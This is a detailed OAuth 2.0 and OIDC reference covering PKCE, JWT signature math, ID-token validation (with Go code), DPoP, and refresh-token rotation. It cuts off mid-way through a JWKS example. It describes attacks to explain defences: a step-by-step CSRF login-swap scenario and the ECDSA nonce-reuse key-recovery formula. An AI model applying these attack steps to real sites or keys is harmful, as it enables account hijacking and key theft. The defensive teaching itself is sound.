# OAuth 2.0 / OIDC — Deep Dive

> *OAuth 2.0 is a delegation protocol; OIDC is an identity protocol layered atop it. Both reduce to a set of cryptographic invariants — challenge entropy, signature soundness, redirect-URI exact-match, time-bounded token freshness — composed into a state machine whose adversary model is web-scale, partially-trusted, and high-volume. This page formalises every step.*

---

## OAuth 2.0 Roles & Grant Types — full taxonomy

### Roles (RFC 6749 §1.1)

| Role | Symbol | Description | Concrete example |
|:---|:---:|:---|:---|
| Resource Owner | `RO` | Entity capable of granting access to a protected resource. Almost always a human. | A GitHub user authorising "Gitter" to read their email. |
| Client | `C` | Application making protected resource requests on behalf of the resource owner. | The Gitter web app. |
| Authorization Server | `AS` | Server issuing access tokens after successful authentication and consent. | `github.com/login/oauth/...` |
| Resource Server | `RS` | Server hosting the protected resources, accepting access tokens. | `api.github.com` |
| User Agent | `UA` | Browser or native app rendering UI for the resource owner. | Chrome, Safari, mobile WebView (deprecated). |

The four roles can collapse: in `client_credentials`, `RO == C`. In a self-issued OIDC IdP, `AS == RS`. In confidential JWT-bearer flows, `AS` may be eliminated entirely.

### Client Types (RFC 6749 §2.1)

```
        ┌────────────────────────────────────────────────────────┐
        │   Client Type Decision Tree                            │
        │                                                        │
        │   Can client securely store a long-lived secret?       │
        │      ├── YES (server-side web app, daemon) ──→ Confidential │
        │      └── NO  (SPA, mobile, desktop) ────────→ Public       │
        └────────────────────────────────────────────────────────┘
```

- **Confidential client**: holds `client_secret` known only to itself and the AS. Authenticates to `/token` endpoint via `client_secret_basic`, `client_secret_post`, `private_key_jwt`, or `tls_client_auth` (RFC 8705).
- **Public client**: cannot keep a secret. MUST use PKCE. SHOULD use refresh-token rotation (RFC 6819, RFC 9700).
- **Credentialed client** (OAuth 2.1 informational): public-client topology but holds dynamic-registered credential — eg DCR + DPoP.

### Grant Types (formal taxonomy)

| Grant | RFC | Status (OAuth 2.1) | Use case | Roles required |
|:---|:---:|:---:|:---|:---:|
| `authorization_code` (with PKCE) | 6749 §4.1 + 7636 | **REQUIRED** | Server-side web, SPA, mobile | RO + UA + C + AS |
| `client_credentials` | 6749 §4.4 | **REQUIRED** | Service-to-service, M2M, CI/CD | C + AS only |
| `refresh_token` | 6749 §6 | **REQUIRED (with rotation for public)** | Renewal of access tokens | C + AS |
| `urn:ietf:params:oauth:grant-type:device_code` | 8628 | **OPTIONAL** | TVs, CLIs, IoT, headless | RO via UA + C (limited input) + AS |
| `urn:ietf:params:oauth:grant-type:jwt-bearer` | 7523 | **OPTIONAL** | Federated trust, signed assertion | C (assertion holder) + AS |
| `urn:ietf:params:oauth:grant-type:saml2-bearer` | 7522 | **OPTIONAL** | SAML→OAuth bridge | SAML IdP → AS |
| `urn:ietf:params:oauth:grant-type:token-exchange` | 8693 | **OPTIONAL** | Identity propagation, delegation | C + AS |
| `password` (Resource Owner Password Credentials) | 6749 §4.3 | **REMOVED** | Legacy migration only | RO + C (high trust) + AS |
| `implicit` (response_type=token) | 6749 §4.2 | **REMOVED** | (Was: in-browser SPAs) | RO + UA + C + AS |

#### Decision tree per use case

```
Building...                            Use this grant
─────────────────────────────────────  ─────────────────────────────
Server-side web (Django, Rails, Go)    authorization_code + PKCE
Single-page app (React, Vue, Svelte)   authorization_code + PKCE
                                         (NEVER implicit; deprecated)
Native mobile (iOS, Android)           authorization_code + PKCE
                                         (RFC 8252 native-app BCP)
Desktop app                            authorization_code + PKCE +
                                         loopback redirect 127.0.0.1:port
Service-to-service backend             client_credentials
Cron / batch job in CI                 client_credentials
                                         (or jwt-bearer for federated)
TV / smart-display / printer           device_authorization grant
                                         (RFC 8628)
CLI tool needing user identity         device_authorization OR
                                         authorization_code w/ loopback
Trusted first-party (legacy only)      Migrate OFF password grant.
                                         If forced: ROPC + step-up MFA
Identity delegation (resource access   token_exchange (RFC 8693)
  on behalf of upstream user)
```

### Endpoint set

| Endpoint | Method | Purpose | RFC |
|:---|:---:|:---|:---:|
| `/authorize` | GET (browser) | Front-channel — display consent | 6749 §3.1 |
| `/token` | POST (back-channel) | Issue access/refresh/id tokens | 6749 §3.2 |
| `/revoke` | POST | Invalidate token | 7009 |
| `/introspect` | POST | Resource-server token validation | 7662 |
| `/userinfo` | GET | OIDC subject claims | OIDC Core §5.3 |
| `/.well-known/openid-configuration` | GET | Discovery document | OIDC Discovery |
| `/jwks_uri` | GET | Public signing keys (JSON) | OIDC Core §10.1 |
| `/par` (Pushed Authorization Request) | POST | Pre-stage authorization params | 9126 |
| `/device_authorization` | POST | Initiate device grant | 8628 |
| `/end_session` | GET | OIDC RP-initiated logout | OIDC Session 1.0 |

---

## Authorization Code + PKCE Flow Mathematics

### PKCE construction (RFC 7636 §4)

PKCE (Proof Key for Code Exchange, pronounced "pixie") binds the front-channel `/authorize` request to the back-channel `/token` request via a one-time secret known only to the client.

#### `code_verifier` generation

```
code_verifier := high-entropy cryptographic random string,
                   ASCII alphabet [A-Z][a-z][0-9]-._~
                   length: 43 ≤ |verifier| ≤ 128
```

The 66-character unreserved alphabet `[A-Za-z0-9-._~]` yields 6.044 bits of entropy per character.

| Length | Entropy bits | Brute-force time @ 10⁹ guesses/sec |
|:---:|:---:|:---:|
| 43 | 259.9 | 2²⁵⁹ / 10⁹ ≈ 10⁶² seconds |
| 64 | 386.8 | 2³⁸⁶ / 10⁹ ≈ 10¹⁰⁰ seconds |
| 128 | 773.6 | 2⁷⁷³ / 10⁹ ≈ 10²²² seconds |

The minimum 43-char verifier ⇒ 256 bits effective entropy after Base64URL encoding of 32 random bytes:

```
code_verifier = BASE64URL(random(32))  // 32 bytes → 43 chars (no padding)
```

#### `code_challenge` derivation

```
S256 (REQUIRED in OAuth 2.1):
    code_challenge = BASE64URL(SHA256(ASCII(code_verifier)))

plain (REMOVED in OAuth 2.1):
    code_challenge = code_verifier
```

#### S256 vs plain — entropy & replay analysis

| Property | `plain` | `S256` |
|:---|:---:|:---:|
| Verifier ≡ challenge? | YES | NO (one-way SHA-256) |
| Network observer recovers verifier? | YES (it IS the challenge) | NO (preimage = 2²⁵⁶) |
| Useful when client cannot SHA-256? | Niche / never | n/a |
| Required by OAuth 2.1? | NO (removed) | YES |
| Withstands code-interception attack? | NO | YES |

**Replay analysis for `S256`**: if attacker `A` intercepts `code_challenge` from the front-channel, the attacker cannot construct a valid `code_verifier` because

$$\Pr\left[\text{find}\ v'\ :\ \text{SHA256}(v') = c \mid c\ \text{public}\right] = 2^{-256}$$

assuming SHA-256 preimage resistance.

For `plain`, since `code_challenge == code_verifier`, the attacker who reads the front-channel wins immediately:

$$\Pr[\text{success} \mid \text{front-channel observed}] = 1$$

#### `state` parameter

`state` is opaque to the AS, returned by the AS in the redirect, validated by the client.

```
state := BASE64URL(random(16))   // ≥ 128 bits
```

Threat model — **CSRF on the redirect endpoint**:

```
1. Victim has session at AS.
2. Attacker initiates an /authorize request, gets a code C_attacker for THEIR account.
3. Attacker tricks victim into visiting:
       https://victim-app.example/cb?code=C_attacker&state=anything
4. Without state validation, victim's app exchanges C_attacker for an access token
   bound to ATTACKER's identity.
5. Victim is now logged into the app AS THE ATTACKER — any uploaded data is
   visible to the attacker.
```

Validation invariant:

$$\text{state}_{\text{returned}} \stackrel{?}{=} \text{state}_{\text{stored in session}}$$

If unequal ⇒ reject. Cryptographic binding makes forgery probability $2^{-128}$.

#### `nonce` parameter (OIDC)

`nonce` is opaque to the AS, included in the **ID token** by the AS, validated by the client.

```
nonce := BASE64URL(random(16))   // ≥ 128 bits
```

Threat model — **ID token replay**:

```
1. Attacker captures id_token from network or browser history.
2. Without nonce, attacker can replay the id_token in an unrelated session and
   the RP cannot distinguish replay from legitimate fresh login.
3. With nonce, attacker would need to predict the victim's stored nonce —
   probability 2^{-128} per attempt.
```

`state` mitigates **request forgery** (front-channel CSRF). `nonce` mitigates **token replay** (back-channel + ID-token reuse). They are NOT interchangeable.

### Exact 9-message timing diagram

```
 ┌─────────┐     ┌───────────┐     ┌─────────────┐     ┌──────────┐
 │ User UA │     │ Client C  │     │ AuthSrv AS  │     │ ResSrv RS│
 └────┬────┘     └─────┬─────┘     └──────┬──────┘     └────┬─────┘
      │                │                  │                  │
      │ 1. GET /login  │                  │                  │
      │───────────────>│                  │                  │
      │                │                  │                  │
      │       (C generates: state, nonce, code_verifier,     │
      │        code_challenge = SHA256(code_verifier))       │
      │                │                  │                  │
      │ 2. 302 Location: AS/authorize?    │                  │
      │     response_type=code&           │                  │
      │     client_id=C&                  │                  │
      │     redirect_uri=https://c.app/cb&│                  │
      │     scope=openid email&           │                  │
      │     state=S&nonce=N&              │                  │
      │     code_challenge=X&             │                  │
      │     code_challenge_method=S256    │                  │
      │<───────────────│                  │                  │
      │                │                  │                  │
      │ 3. GET /authorize?...              │                 │
      │────────────────────────────────────>                 │
      │                │                  │                  │
      │ 4. (User authenticates, consents) │                  │
      │ <─── consent screen ───            │                 │
      │ ─── approve ──>                    │                 │
      │                │                  │                  │
      │ 5. 302 https://c.app/cb?code=AC&state=S              │
      │<───────────────────────────────────                  │
      │                │                  │                  │
      │ 6. GET /cb?code=AC&state=S        │                  │
      │───────────────>│                  │                  │
      │                │ verify state == stored S            │
      │                │                  │                  │
      │ 7. POST /token                    │                  │
      │     grant_type=authorization_code&                   │
      │     code=AC&                      │                  │
      │     redirect_uri=https://c.app/cb&│                  │
      │     client_id=C&                  │                  │
      │     code_verifier=V               │                  │
      │     (Authorization: Basic if confidential)           │
      │                │─────────────────>│                  │
      │                │                  │                  │
      │       AS verifies: SHA256(V) == X stored at step 3   │
      │                │                  │                  │
      │ 8. 200 { access_token, id_token, refresh_token, expires_in }│
      │                │<─────────────────│                  │
      │                │                  │                  │
      │       C validates id_token (12 steps below)          │
      │                │                  │                  │
      │ 9. GET /api/x  Authorization: Bearer <access_token>  │
      │                │────────────────────────────────────>│
      │                │  RS validates token (introspect or  │
      │                │  JWT signature) → returns resource  │
      │                │<────────────────────────────────────│
```

The 9-step minimum is asymptotic; in practice, IdP MFA, consent caching, refresh-token grants, and JWKS fetch add 2–5 round-trips.

### Worked-numbers example

```
code_verifier  = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"   (43 chars, 256 bits)
code_challenge = SHA256(code_verifier) → 32 bytes → BASE64URL
               = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"
```

The verifier on the wire (step 7) is opaque without prior knowledge of the SHA-256 preimage.

---

## Token Formats

### JWT structure (RFC 7519)

```
JWT = BASE64URL(UTF8(header))   "."
      BASE64URL(UTF8(payload))  "."
      BASE64URL(signature)
```

`header` is a JSON object with at minimum `{"alg": "<sigalg>", "typ": "JWT"}`. Optional: `kid` (key ID), `jku` (JWKS URL), `cty` (content type for nested JWE).

`payload` is a JSON object with reserved claims `iss`, `sub`, `aud`, `exp`, `nbf`, `iat`, `jti` plus any private claims.

`signature` is computed over the concatenation `BASE64URL(header) "." BASE64URL(payload)` — call this the **signing input** $\sigma_{\text{in}}$.

### Signature math per algorithm

#### HS256 (HMAC-SHA256, RFC 7518 §3.2)

$$\text{HS256}(K, \sigma_{\text{in}}) = \text{HMAC-SHA256}(K, \sigma_{\text{in}})$$

Where HMAC (RFC 2104):

$$\text{HMAC}(K, m) = H((K \oplus \text{opad}) \,\Vert\, H((K \oplus \text{ipad}) \,\Vert\, m))$$

`opad = 0x5c × 64`, `ipad = 0x36 × 64`, $H = \text{SHA-256}$.

- Output: 32 bytes → 43 BASE64URL chars.
- Key requirement: `|K| ≥ 32 bytes` (RFC 7518); shorter keys reduce security to $|K|$ bits.
- Verification: same as signing → string-compare.
- Symmetric: signer and verifier share `K`. Suitable only when verifier is trusted by all signers.

#### RS256 (RSA-PKCS#1 v1.5 with SHA-256, RFC 8017)

Sign:
$$s = (\text{EM})^d \bmod n$$

Where `EM = EMSA-PKCS1-v1_5(SHA-256(σ_in), |n|/8)` is the PKCS#1 v1.5 padded encoded message. Public exponent typically `e = 65537`.

Verify:
$$m' = s^e \bmod n,\quad \text{accept iff}\ m' \stackrel{?}{=} \text{EM}$$

| Key size | Modulus bytes | Signature bytes | Security level |
|:---:|:---:|:---:|:---:|
| 2048 | 256 | 256 | 112-bit |
| 3072 | 384 | 384 | 128-bit |
| 4096 | 512 | 512 | ~140-bit |

#### ES256 (ECDSA P-256 with SHA-256, FIPS 186-4)

Curve: NIST P-256 (`secp256r1`). Order $n$ ≈ 2²⁵⁶. Generator $G$.

Sign (with random $k \in [1, n-1]$):

$$h = \text{SHA-256}(\sigma_{\text{in}})$$
$$(x_1, y_1) = k \cdot G$$
$$r = x_1 \bmod n$$
$$s = k^{-1}(h + r \cdot d) \bmod n$$

If $r = 0$ or $s = 0$, retry with new $k$. Signature is the byte concatenation `r || s`, 32 bytes each → **64 bytes total** (NOT DER-encoded; see RFC 7515 §3).

Verify:
$$u_1 = h \cdot s^{-1} \bmod n$$
$$u_2 = r \cdot s^{-1} \bmod n$$
$$(x_1, y_1) = u_1 G + u_2 Q$$
$$\text{accept iff}\ x_1 \equiv r \pmod n$$

**Critical**: $k$ MUST be unique per signature. A single $k$ reuse leaks the private key:

$$d = \frac{s_1 h_2 - s_2 h_1}{r(s_2 - s_1)} \bmod n$$

This is exactly the Sony PS3 ECDSA failure (2010).

#### EdDSA (Ed25519, RFC 8037 + RFC 8032)

Curve: edwards25519. Order ≈ 2²⁵². 32-byte private key, 32-byte public key.

Deterministic: $k$ derived as $k = \text{SHA-512}(\text{prefix} \,\Vert\, \sigma_{\text{in}})$, eliminating RNG-failure leakage.

$$R = k \cdot B$$
$$S = (k + \text{SHA-512}(R \,\Vert\, A \,\Vert\, \sigma_{\text{in}}) \cdot a) \bmod \ell$$

Where $a$ is the secret scalar derived from the private key. Signature is `R || S`, 32+32 = **64 bytes**.

| Algorithm | Sig bytes | Sign µs | Verify µs | RNG-free? | Recommended use |
|:---|:---:|:---:|:---:|:---:|:---|
| HS256 | 32 | 1 | 1 | n/a | Single-tenant, internal API only |
| RS256 | 256 | ~1500 | ~50 | yes (PKCS1) | Default for federated OIDC |
| RS512 | 256 | ~1500 | ~50 | yes | Same as RS256, larger digest |
| PS256 (RSASSA-PSS) | 256 | ~1700 | ~60 | NO (salt) | Modern RSA, replacing PKCS1-v1.5 |
| ES256 | 64 | ~250 | ~700 | NO (k) | Mobile, IoT, JWKS where size matters |
| ES384 | 96 | ~700 | ~2000 | NO (k) | Higher security ECC |
| EdDSA / Ed25519 | 64 | ~50 | ~150 | yes (deterministic) | Modern preferred |

(Numbers indicative for a 2.4 GHz x86_64 server; vary with library and AES-NI / ADX availability.)

### JWT vs opaque token tradeoff

| Concern | JWT | Opaque |
|:---|:---:|:---:|
| Validation | Stateless — verify signature locally | Stateful — call `/introspect` |
| Validation latency | ~1 ms (signature) | ~10–50 ms (network round-trip) |
| Validation cost @ 10k rps | 10k sigs / sec on RS256 ≈ 200 ms / vCPU; cheap | 10k introspect / sec ≈ heavy load on AS |
| Revocation | Hard — token valid until `exp` | Easy — invalidate at AS |
| Token size | 0.5–4 KB | ~32 bytes |
| Bearer leakage exposure | Until `exp` (typ. 5–60 min) | Until next introspection |
| Best access-token TTL | Short (5–15 min) | Longer (1 h+) |
| Best for | Microservice fan-out, gRPC, edge | Long-lived sessions, fine revoke |

**Hybrid pattern**: JWT access-token + opaque refresh-token, JWT for fast hot-path, refresh provides revocation point.

### JWE — encrypted JWT (RFC 7516)

```
JWE = BASE64URL(header)
     "." BASE64URL(encrypted_key)
     "." BASE64URL(iv)
     "." BASE64URL(ciphertext)
     "." BASE64URL(tag)
```

Two-step encryption: the payload is encrypted with a Content Encryption Key (CEK); the CEK itself is encrypted with the recipient's key (key management mode).

#### Key management modes

| `alg` | Method | Key material |
|:---|:---|:---|
| `dir` | CEK is the shared symmetric key directly | Shared AES key |
| `RSA-OAEP-256` | Wrap CEK with recipient RSA public key (OAEP w/ SHA-256) | Recipient RSA-2048+ |
| `ECDH-ES` | Diffie-Hellman with ephemeral sender key, derive CEK via Concat KDF | Recipient ECC + ephemeral |
| `ECDH-ES+A256KW` | DH + AES key-wrap of CEK | Recipient ECC + AES-KW |
| `A256KW` | AES-256 key wrap (RFC 3394) | Pre-shared AES-256 |
| `A256GCMKW` | AES-256-GCM key wrap | Pre-shared AES-256 |

#### Content encryption modes

| `enc` | Cipher | IV | Tag | Notes |
|:---|:---|:---:|:---:|:---|
| `A256GCM` | AES-256-GCM | 96 bits | 128 bits | Preferred — AEAD, hardware accel |
| `A192GCM` | AES-192-GCM | 96 bits | 128 bits | Less common |
| `A128GCM` | AES-128-GCM | 96 bits | 128 bits | OK |
| `A256CBC-HS512` | AES-256-CBC + HMAC-SHA512 | 128 bits | 256 bits | EtM construction |
| `A128CBC-HS256` | AES-128-CBC + HMAC-SHA256 | 128 bits | 128 bits | EtM, broadly compatible |
| `XC20P` | XChaCha20-Poly1305 | 192 bits | 128 bits | Modern, no AES-NI dependency |

For nested encryption + signing: `JWE(JWS(claims))` — sign first, then encrypt. The inner JWS provides non-repudiation; the outer JWE provides confidentiality. `cty: JWT` in the outer header indicates a nested JWT.

### DPoP — Demonstrating Proof-of-Possession (RFC 9449)

Bearer-token attacker model: any party in possession of an access token wins.
DPoP-token attacker model: attacker must possess BOTH the token AND the client's signing key.

#### DPoP proof JWT structure

Header:
```json
{
  "typ": "dpop+jwt",
  "alg": "ES256",
  "jwk": { "kty": "EC", "crv": "P-256", "x": "...", "y": "..." }
}
```

Payload:
```json
{
  "jti": "f8b9c1...random...",     // unique identifier (anti-replay)
  "htm": "POST",                    // HTTP method
  "htu": "https://api.ex.com/data", // HTTP URI (no query/fragment)
  "iat": 1714200000,                // issued-at
  "ath": "BASE64URL(SHA256(access_token))"  // optional: bind to AT
}
```

Signed with the private key whose public key is in the `jwk` header. Per request, the resource server checks:

1. Signature valid against the `jwk` in the header.
2. `htm` matches the actual HTTP method.
3. `htu` matches the request URI (sans query string).
4. `iat` is fresh (typ. ±5 minutes).
5. `jti` not already seen (replay cache, e.g. 5-minute window).
6. If `ath` present: `ath == BASE64URL(SHA256(access_token))`.
7. If access token has `cnf` claim: `jkt(cnf) == jkt(jwk)` where `jkt = BASE64URL(SHA256(canonical_jwk))`.

#### Cryptographic binding

The access token contains:
```json
{
  "cnf": { "jkt": "BASE64URL(SHA256(canonical_JWK_thumbprint))" },
  ...
}
```

Per RFC 7638, the JWK thumbprint canonicalizes JSON before SHA-256:
$$\text{jkt} = \text{BASE64URL}(\text{SHA-256}(\text{Canonical-JSON}(\text{JWK})))$$

Thus an attacker who steals the access token cannot replay it without ALSO stealing the private signing key.

---

## OIDC ID Token Validation Algorithm

Per OIDC Core 1.0 §3.1.3.7, the client (Relying Party, RP) MUST validate the ID token in the following 12 steps. Skipping any step opens a known vulnerability.

### Step-by-step

```
INPUT:  id_token (JWS compact serialization)
        client_id
        nonce_stored (if sent)
        max_age (if sent)
        oidc_discovery_doc

STEP 1: iss (issuer) match
        Decode JWT payload.
        Assert payload.iss == discovery.issuer (string equality, exact).
        FAIL → Stop. Reject.

STEP 2: aud (audience) match
        Assert client_id ∈ payload.aud.
        - If aud is a string, must equal client_id.
        - If aud is an array, client_id must be present.
        FAIL → Reject.

STEP 3: azp (authorized party) validation
        If payload.aud is an array AND |aud| > 1:
            Assert payload.azp is present.
            Assert payload.azp == client_id.
        If payload.azp present (single aud):
            Assert payload.azp == client_id.
        FAIL → Reject.

STEP 4: signature verification
        Lookup key by header.kid in JWKS at discovery.jwks_uri.
        If key not found and JWKS cache is stale: refetch JWKS, retry.
        Verify JWS signature using header.alg and the resolved key.
        FAIL → Reject.

STEP 5: alg pinning
        Assert header.alg ∈ allowed_algs (set of accepted algorithms registered for this client).
        Assert header.alg ≠ "none".
        Assert header.alg matches the alg in client registration (id_token_signed_response_alg).
        FAIL → Reject.

STEP 6: exp (expiry)
        Assert (current_time - clock_skew_tolerance) < payload.exp.
        Recommended skew: ≤ 5 min.
        FAIL → Reject.

STEP 7: iat (issued-at) freshness
        Assert payload.iat ≥ (current_time - max_iat_age).
        Recommended max_iat_age: 5–15 min.
        FAIL → Reject (stale token).

STEP 8: nonce match
        If nonce was sent in /authorize:
            Assert payload.nonce == nonce_stored.
            One-time use: invalidate nonce_stored after match.
        FAIL → Reject (replay).

STEP 9: acr / amr validation
        If acr_values was requested:
            Assert payload.acr ∈ requested acr_values.
        If amr-based MFA required:
            Assert MFA-class amr present (e.g. "mfa", "otp", "fpt").
        FAIL → Reject (insufficient assurance).

STEP 10: auth_time freshness
        If max_age was sent OR client requires re-authentication window:
            Assert payload.auth_time is present.
            Assert (current_time - payload.auth_time) ≤ max_age.
        FAIL → Reauthenticate.

STEP 11: at_hash (access-token hash)
        If response includes access_token (i.e. response_type contains "token"):
            Compute expected:
                bits = sigalg → hash bits (e.g. RS256 → SHA-256 → 256 bits)
                full = SHA-bits(ASCII(access_token))
                halflen = bits / 16  (i.e. take leftmost half-byte-count octets)
                expected = BASE64URL(full[0:halflen])
            Assert payload.at_hash == expected.
        FAIL → Reject (token-binding mismatch — possible MITM swap).

STEP 12: c_hash (code hash)
        If response includes code (response_type contains "code id_token"):
            Compute expected = same construction as at_hash, but on ASCII(code).
            Assert payload.c_hash == expected.
        FAIL → Reject (hybrid-flow code-binding mismatch).

OUTPUT: id_token validated. Subject = payload.sub.
```

### Reference Go pseudocode

```go
package oidc

import (
    "crypto/sha256"
    "crypto/sha384"
    "crypto/sha512"
    "encoding/base64"
    "errors"
    "time"
)

type Discovery struct {
    Issuer  string `json:"issuer"`
    JWKSURI string `json:"jwks_uri"`
}

type IDClaims struct {
    Iss      string   `json:"iss"`
    Sub      string   `json:"sub"`
    Aud      []string `json:"aud"`     // can be string or []string in JSON
    Azp      string   `json:"azp,omitempty"`
    Exp      int64    `json:"exp"`
    Iat      int64    `json:"iat"`
    AuthTime int64    `json:"auth_time,omitempty"`
    Nonce    string   `json:"nonce,omitempty"`
    Acr      string   `json:"acr,omitempty"`
    Amr      []string `json:"amr,omitempty"`
    AtHash   string   `json:"at_hash,omitempty"`
    CHash    string   `json:"c_hash,omitempty"`
}

type ValidateOpts struct {
    ClientID         string
    Nonce            string
    MaxAge           time.Duration
    SkewTolerance    time.Duration
    AllowedAlgs      map[string]bool
    AccessToken      string // for at_hash check, "" if absent
    Code             string // for c_hash check, "" if absent
    Now              func() time.Time
    Discovery        Discovery
}

func ValidateIDToken(rawJWT string, opts ValidateOpts) (*IDClaims, error) {
    header, claims, sig, signingInput, err := parseJWS(rawJWT)
    if err != nil { return nil, err }

    // STEP 5: alg pinning (before signature verify, to prevent alg-confusion)
    if header.Alg == "none" || !opts.AllowedAlgs[header.Alg] {
        return nil, errors.New("alg not allowed")
    }

    // STEP 4: signature verification
    key, err := lookupJWK(opts.Discovery.JWKSURI, header.Kid)
    if err != nil { return nil, err }
    if !verifySig(header.Alg, key, signingInput, sig) {
        return nil, errors.New("signature invalid")
    }

    // STEP 1: iss
    if claims.Iss != opts.Discovery.Issuer {
        return nil, errors.New("iss mismatch")
    }

    // STEP 2: aud
    foundAud := false
    for _, a := range claims.Aud {
        if a == opts.ClientID { foundAud = true; break }
    }
    if !foundAud { return nil, errors.New("aud missing client_id") }

    // STEP 3: azp
    if len(claims.Aud) > 1 || claims.Azp != "" {
        if claims.Azp != opts.ClientID {
            return nil, errors.New("azp mismatch")
        }
    }

    now := opts.Now()
    skew := opts.SkewTolerance

    // STEP 6: exp
    if now.Add(-skew).Unix() >= claims.Exp {
        return nil, errors.New("token expired")
    }

    // STEP 7: iat freshness — bound by max iat age (here: 15 min)
    if now.Unix()-claims.Iat > 900 {
        return nil, errors.New("iat too old")
    }

    // STEP 8: nonce
    if opts.Nonce != "" && claims.Nonce != opts.Nonce {
        return nil, errors.New("nonce mismatch (replay?)")
    }

    // STEP 10: auth_time
    if opts.MaxAge > 0 {
        if claims.AuthTime == 0 {
            return nil, errors.New("auth_time required by max_age")
        }
        if now.Sub(time.Unix(claims.AuthTime, 0)) > opts.MaxAge {
            return nil, errors.New("auth_time exceeds max_age")
        }
    }

    // STEP 11: at_hash
    if opts.AccessToken != "" && claims.AtHash != "" {
        expected, err := computeHalfHash(header.Alg, opts.AccessToken)
        if err != nil { return nil, err }
        if claims.AtHash != expected {
            return nil, errors.New("at_hash mismatch")
        }
    }

    // STEP 12: c_hash
    if opts.Code != "" && claims.CHash != "" {
        expected, err := computeHalfHash(header.Alg, opts.Code)
        if err != nil { return nil, err }
        if claims.CHash != expected {
            return nil, errors.New("c_hash mismatch")
        }
    }

    return &claims, nil
}

// computeHalfHash: take leftmost-half of hash output, BASE64URL encode.
func computeHalfHash(alg, value string) (string, error) {
    var sum []byte
    switch alg {
    case "RS256", "ES256", "PS256", "HS256":
        h := sha256.Sum256([]byte(value)); sum = h[:16]   // 256/2 bits = 16 bytes
    case "RS384", "ES384", "PS384", "HS384":
        h := sha384.Sum384([]byte(value)); sum = h[:24]   // 384/2 bits = 24 bytes
    case "RS512", "ES512", "PS512", "HS512":
        h := sha512.Sum512([]byte(value)); sum = h[:32]   // 512/2 bits = 32 bytes
    default:
        return "", errors.New("unsupported alg for hash")
    }
    return base64.RawURLEncoding.EncodeToString(sum), nil
}
```

### at_hash math intuition

For RS256 (SHA-256, 256 bits = 32 bytes):

```
full   = SHA-256(access_token)            // 32 bytes
half   = full[0:16]                       // leftmost 16 bytes
at_hash = BASE64URL(half)                 // 22 chars (no padding)
```

This binds the ID token to the access token issued in the same response; if an attacker swaps an access token in transit, `at_hash` mismatches.

The "leftmost half" rule (rather than full hash) saves space — JWTs are size-sensitive — at the cost of preimage security: $2^{128}$ rather than $2^{256}$. Still computationally infeasible.

---

## Token Lifetime & Refresh Math

### Recommended TTLs

| Token | Recommended TTL | Rationale |
|:---|:---:|:---|
| `access_token` (JWT) | 5–15 min | Short window limits theft impact; JWT revocation hard |
| `access_token` (opaque) | 30–60 min | Longer OK because revocable via introspection |
| `id_token` | 5–15 min | Identity assertion freshness; never re-used as bearer |
| `refresh_token` (confidential client) | 30–90 days | Stored server-side, revocable |
| `refresh_token` (public client w/ rotation) | 24h–7 days | Rotated each use; absolute lifetime caps exposure |
| `device_code` | 10–15 min | Short device-binding window |

### Sliding window vs absolute timeout

Two refresh-token expiry policies:

**Absolute timeout**: refresh token has fixed `exp = iat + T_abs`, regardless of usage. After `T_abs` elapses, user MUST reauthenticate.

**Sliding window**: each refresh extends `exp` by `T_slide`, capped at `iat + T_max`. User stays logged in indefinitely while active, but must reauthenticate after `T_max` of inactivity-rounded usage.

Tradeoff:

| Policy | UX | Risk |
|:---|:---:|:---:|
| Absolute only | Forced re-login at boundary | Predictable, compliance-friendly |
| Sliding only | Effectively forever | One token theft = permanent compromise |
| Sliding + absolute cap | Best UX with bounded risk | Standard recommendation |

Math: with sliding window of duration $T_s$ and absolute cap $T_a$, a user using the app every $\Delta < T_s$ stays authenticated for exactly $T_a$. A user who lapses for $\Delta > T_s$ must reauthenticate.

### Refresh token rotation (RFC 6819 §5.2.2.3, RFC 9700)

Each `/token` exchange with `grant_type=refresh_token` returns a NEW refresh token; the old one is invalidated:

```
                  POST /token (rt_n)
                  ┌────────────────┐
   Client ────────┤ access, rt_n+1 ├──────> Client
                  └────────────────┘
                  AS marks rt_n as used, binds rt_n+1 to the same chain.
```

Replay-detection invariant:

```
INVARIANT:  every refresh-token chain has at most ONE non-revoked descendant.

If AS receives an already-used refresh token rt_n while rt_n+1 (or higher)
is still active:
    REVOKE the entire chain (rt_0, rt_1, ..., rt_n+k for all k).
```

This catches refresh-token theft: if attacker steals rt_n and refreshes first, the legitimate client's later refresh attempt with rt_n triggers chain-wide revocation, forcing reauthentication. The attacker's token tree is destroyed simultaneously.

#### Theft detection time bound

Let $\Delta_a$ = attacker's time-to-first-use after theft, $\Delta_v$ = victim's time-to-next-refresh. Detection occurs at $\max(\Delta_a, \Delta_v)$ when the second use of the same `rt_n` occurs. Worst-case window of attacker exclusive access: $\Delta_v$ (until victim refreshes). Best-case: 0 (victim refreshes first; attacker's rt_n is dead-on-arrival).

Expected attacker window:

$$E[\text{window}] = \int_0^{T_s} \Delta_v \cdot P(\Delta_v) \, d\Delta_v \approx T_s / 2$$

assuming uniform user-activity distribution within the sliding-window bound. Hence shorter `T_s` ⇒ tighter detection.

---

## Discovery & JWKS

### `.well-known/openid-configuration` — required fields

Per OIDC Discovery 1.0 §3:

```json
{
  "issuer": "https://idp.example.com",
  "authorization_endpoint": "https://idp.example.com/oauth/authorize",
  "token_endpoint": "https://idp.example.com/oauth/token",
  "userinfo_endpoint": "https://idp.example.com/userinfo",
  "jwks_uri": "https://idp.example.com/.well-known/jwks.json",
  "registration_endpoint": "https://idp.example.com/connect/register",
  "scopes_supported": ["openid", "profile", "email", "offline_access"],
  "response_types_supported": ["code", "id_token", "code id_token"],
  "response_modes_supported": ["query", "fragment", "form_post"],
  "grant_types_supported": [
    "authorization_code",
    "refresh_token",
    "client_credentials",
    "urn:ietf:params:oauth:grant-type:device_code"
  ],
  "subject_types_supported": ["public", "pairwise"],
  "id_token_signing_alg_values_supported": ["RS256", "ES256", "EdDSA"],
  "token_endpoint_auth_methods_supported": [
    "client_secret_basic", "client_secret_post",
    "client_secret_jwt", "private_key_jwt", "tls_client_auth"
  ],
  "code_challenge_methods_supported": ["S256"],
  "claims_supported": ["sub", "iss", "aud", "exp", "iat",
                        "name", "email", "email_verified", "picture"]
}
```

### JWKS format

```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "rsa-2024-q4",
      "alg": "RS256",
      "n": "...base64url-encoded modulus...",
      "e": "AQAB"
    },
    {
      "kty": "EC",
      "use": "sig",
      "kid": "ec-2024-q4",
      "alg": "ES256",
      "crv": "P-256",
